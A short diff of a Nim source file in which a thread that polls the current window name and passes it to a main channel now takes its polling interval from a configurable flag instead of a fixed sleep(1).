@@ -12,6 +12,8 @@ from winim/winstr import `$`
 
 from ../constants import BUFFER_LENGTH
 
+from ../flags import WINDOW_NAME_THREAD_CHECK_INTERVAL
+
 from ../channels import mainChannel
 
 type windowNameResult = tuple[worked: bool, data: string]
@@ -41,4 +43,4 @@ proc initWindowNameThread*(): void {.thread.} =
       mainChannel.send windowName
       prevWindowName = windowName
 
-    sleep(1)
+    sleep(WINDOW_NAME_THREAD_CHECK_INTERVAL)
